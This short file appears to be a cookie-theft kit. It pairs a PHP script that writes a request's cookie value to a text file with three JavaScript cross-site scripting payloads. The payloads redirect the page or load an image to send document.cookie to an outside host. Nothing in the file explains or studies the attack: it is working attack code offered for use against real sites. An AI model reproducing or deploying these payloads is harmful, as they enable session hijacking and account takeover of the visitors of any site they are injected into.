<?php
$cookie = $_COOKIE['key'];
$file = fopen('coookie.txt','a');
fwrite($file,$cookie . "\n\n");
?>

 <script>window.location.href= "http://albic.sakura.ne.jp/cookie/"</script>
<script>window.location.href = "http://albic.sakura.ne.jp/cookie?"+document.cookie;</script>
<script>new Image().src="http://albic.sakura.ne.jp/cookie?"+document.cookie</script>
